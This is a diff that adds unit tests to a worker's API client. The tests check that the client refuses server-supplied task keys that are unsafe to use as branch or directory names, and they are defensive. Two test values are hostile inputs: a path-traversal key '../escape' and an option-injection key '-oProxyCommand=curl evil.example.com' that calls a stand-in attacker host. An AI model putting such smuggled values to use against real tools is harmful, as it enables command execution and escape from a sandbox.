@@ -677,3 +677,45 @@ describe("the run identity, from claim through to postEvent", () => {
     expect(JSON.parse(init.body).runId).toBe("run-the-server-recorded");
   });
 });
+
+describe("task keys the worker cannot name safely", () => {
+  function clientFor(projectKey: string) {
+    const fetchMock = vi.fn().mockImplementation(async (url: string) => {
+      if (String(url).endsWith("/tasks/claim")) {
+        return {
+          ok: true,
+          status: 200,
+          json: async () => ({ _id: "t1", taskNumber: 1, title: "Do the thing", description: "" }),
+        };
+      }
+      return { ok: true, status: 200, json: async () => ({ key: projectKey }) };
+    });
+    return { api: createApiClient(config, fetchMock as never, identityStore), fetchMock };
+  }
+
+  it("refuses a key that would traverse out of the worktree root", async () => {
+    const { api } = clientFor("../escape");
+    await expect(api.claim("p1", "run-1")).rejects.toThrow(/\.\.\/escape-1/);
+  });
+
+  it("refuses a key git would read as an option rather than a branch", async () => {
+    const { api } = clientFor("-oProxyCommand=curl evil.example.com");
+    await expect(api.claim("p1", "run-1")).rejects.toThrow(/ProxyCommand/);
+  });
+
+  it("hands the refused task back with the attempt charged", async () => {
+    const { api, fetchMock } = clientFor("../escape");
+    await expect(api.claim("p1", "run-1")).rejects.toThrow();
+
+    const release = fetchMock.mock.calls.find(([url]) =>
+      String(url).endsWith("/api/projects/p1/tasks/t1/release")
+    );
+    expect(release).toBeDefined();
+    expect(JSON.parse(release![1].body)).toEqual({ refund: false });
+  });
+
+  it("accepts an ordinary key", async () => {
+    const { api } = clientFor("BP");
+    expect((await api.claim("p1", "run-1"))?.taskKey).toBe("BP-1");
+  });
+});
